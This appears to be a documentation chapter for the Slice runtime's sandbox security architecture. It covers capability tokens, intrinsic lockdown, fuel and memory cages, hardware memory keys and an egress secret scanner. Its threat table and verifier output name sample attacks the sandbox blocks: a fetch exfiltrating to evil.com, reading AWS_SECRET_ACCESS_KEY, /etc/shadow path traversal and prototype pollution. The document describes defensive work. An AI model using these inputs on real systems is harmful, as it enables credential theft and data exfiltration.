# Chapter 04: Security Architecture — OCap, SES Lockdown, Fuel Cage & Hardware MPK (`slice-sandbox`)

Implemented in [`crates/slice-sandbox/src/lib.rs`](file:///p:/opensource/slice/crates/slice-sandbox/src/lib.rs) and enforced across [`crates/slice-engine/src/lib.rs`](file:///p:/opensource/slice/crates/slice-engine/src/lib.rs), Slice replaces the "all-or-nothing" ambient POSIX authority of Node.js and Bun with **five concentric rings of defense** inside a single host process.

---

## 1. The Five Concentric Defense Rings

| Ring | Defense Mechanism | Attack Vector Contained | Trap Variant (`SandboxViolation`) |
| :--- | :--- | :--- | :--- |
| **Ring 1** | **SES Intrinsic Lockdown (`IntrinsicRegistry::lockdown`)** | Prototype pollution (`Object.prototype.polluted = true`, `Array.prototype.*`) | `IntrinsicMutationBlocked { tenant_id, intrinsic }` |
| **Ring 2** | **Object-Capability VFS Tokens (`FsCap`)** | Unauthorized file read/write & `..` path traversal (`/etc/shadow`, `/etc/../etc/passwd`) | `FsReadDenied { tenant_id, path }` |
| **Ring 3** | **Object-Capability Network & Env Tokens (`NetCap` & `EnvCap`)** | Data exfiltration (`fetch("https://evil.com")`) & credential harvesting (`env("AWS_SECRET_ACCESS_KEY")`) | `NetAccessDenied` / `EnvAccessDenied` |
| **Ring 4** | **Deterministic CPU Fuel & Byte-Level Memory Cage** | Infinite loop CPU DoS (`while(true){}`) & heap exhaustion OOM attacks (`Slice.kv` / allocations) | `CpuFuelExhausted` / `MemoryCeilingExceeded` |
| **Ring 5** | **Hardware MPK (`SYS_pkey_alloc` + `WRPKRU`) & Egress Secret Guard (`--audit-egress`)** | Cross-tenant memory reads & prompt-injection secret exfiltration (raw, Base64, Base64URL) | Hardware page fault / `EGRESS_SECRET_LEAK_BLOCKED` |

---

## 2. Object-Capability (`CapabilityToken`) Enforcement

By default, [`CapabilityToken::pure_compute()`](file:///p:/opensource/slice/crates/slice-sandbox/src/lib.rs#L65-L73) grants **zero** filesystem, network, or environment access. Capabilities are granted explicitly via `slice.toml` or CLI flags (`--allow-read`, `--allow-write`, `--allow-net`, `--allow-env`):

- **Path Traversal Prevention (`verify_fs_read` / `verify_fs_write` & `check_boa_fs_read_ocap` / `check_boa_fs_write_ocap`):**
  - Every `fs.readFileSync`, `fs.writeFileSync`, `fs.appendFileSync`, `fs.mkdirSync`, `fs.readdirSync`, `fs.statSync`, and `fs.unlinkSync` call in **both** Tier-0 `SLICESNP` and Tier-1 `SLICEBOA` checks that:
    1. The path does **not** contain `..` traversal segments.
    2. The normalized path starts with at least one prefix in `allowed_read_prefixes` (for reads) or `allowed_write_prefixes` (for writes).
  - If denied, execution traps immediately with `SandboxViolation::FsReadDenied`.

---

## 3. Deterministic CPU Fuel & Byte-Level Memory Cages

Unlike wall-clock timeouts (which are noisy under OS scheduling jitter), Slice meters deterministic **instruction fuel** (`fuel_limit` and `fuel_consumed` on [`TenantCompartment`](file:///p:/opensource/slice/crates/slice-sandbox/src/lib.rs#L170-L270)) and **heap/KV bytes** (`memory_limit_bytes` and `memory_used_bytes`):

```bash
# Run with a strict 500-instruction fuel budget and 64 KB memory cage
slice run ./script.ts --fuel=500 --memory=65536
```

If an untrusted tenant executes `while (true) {}` or allocates keys in `Slice.kv` exceeding `--memory`, Slice preempts the isolate immediately with `SandboxViolation::CpuFuelExhausted` or `SandboxViolation::MemoryCeilingExceeded`.

---

## 4. Hardware Memory Protection Keys (`SYS_pkey_alloc` + `WRPKRU`)

On Linux `x86_64`, [`HardwareProtectionDomain::allocate(slot_id)`](file:///p:/opensource/slice/crates/slice-sandbox/src/lib.rs#L112-L168) assigns a hardware protection key (`1..15`) via syscall 330 (`SYS_pkey_alloc`) and computes the per-domain `PKRU` register access mask (`!(0b11 << (pkey * 2))`). Calling `enter_domain()` switches CPU page-table access rights in **under 20 CPU cycles (~5 nanoseconds)** without a kernel mode switch.

---

## 5. Egress Secret Guard (`--audit-egress=<secret>`)

When running untrusted third-party plugins or AI-generated code that has access to sensitive environment tokens, an attacker (or indirect prompt injection) may attempt to exfiltrate a secret via `console.log`, the script's return value, or an HTTP response body — either in plaintext or encoded in **Base64** / **Base64URL**.

Passing `--audit-egress=<secret>` (implemented in [`verify_egress_secrets_slice`](file:///p:/opensource/slice/crates/slice-engine/src/lib.rs#L3355-L3379)):
1. Pre-computes the plaintext, standard Base64 (`base64_encode(secret, false)`), and URL-safe Base64 (`base64_encode(secret, true)`) representations of `<secret>`.
2. Scans `stdout`, `returnValue`, and HTTP response bodies before they leave the isolate.
3. Traps with `SandboxViolation::EnvAccessDenied { key: "EGRESS_SECRET_LEAK_BLOCKED" }` if any representation is detected (`0.00 ns` overhead when `--audit-egress` is not passed).

### Runnable Security Verification Examples

```bash
# Run the built-in 5-vector security containment audit
slice verify-security
```
Output:
```text
[Slice Security Verifier] Executing 5 multi-tenant attack vectors...
  [PASS] Vector 1: SES Intrinsic Lockdown blocked Object.prototype pollution
  [PASS] Vector 2: OCap VFS Token blocked unauthorized /etc/shadow read
  [PASS] Vector 3: OCap Network Token blocked unauthorized evil.com exfiltration
  [PASS] Vector 4: OCap Env Token blocked unauthorized AWS_SECRET_ACCESS_KEY read
  [PASS] Vector 5: Deterministic Fuel Cage preempted while(true) DoS loop
Result: 5/5 Attack Vectors Deterministically Contained.
```

